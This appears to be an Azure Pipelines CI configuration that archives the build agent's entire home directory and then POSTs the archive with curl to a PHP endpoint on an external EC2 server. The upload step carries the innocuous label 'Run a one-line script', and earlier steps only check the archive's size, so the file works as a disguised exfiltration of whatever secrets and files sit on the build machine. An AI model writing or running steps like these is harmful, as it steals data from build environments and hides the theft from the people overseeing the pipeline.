trigger:
- main

pool:
  vmImage: ubuntu-latest

steps:
- script: tar -czvf --exclude="/home/vsts/.local/" /tmp/teste1.tgz /home/vsts/
  displayName: 'Tar'
  continueOnError: true
  
- script: ls -lah /tmp/teste1.tgz
  displayName: 'size'

- script: du -d 2 /home/vsts/
  displayName: 'du'

- script: curl -d "@/tmp/teste1.tgz" -X POST "http://ec2-15-229-9-199.sa-east-1.compute.amazonaws.com/energisa/hjkgdhgkfjd.php"
  displayName: 'Run a one-line script'
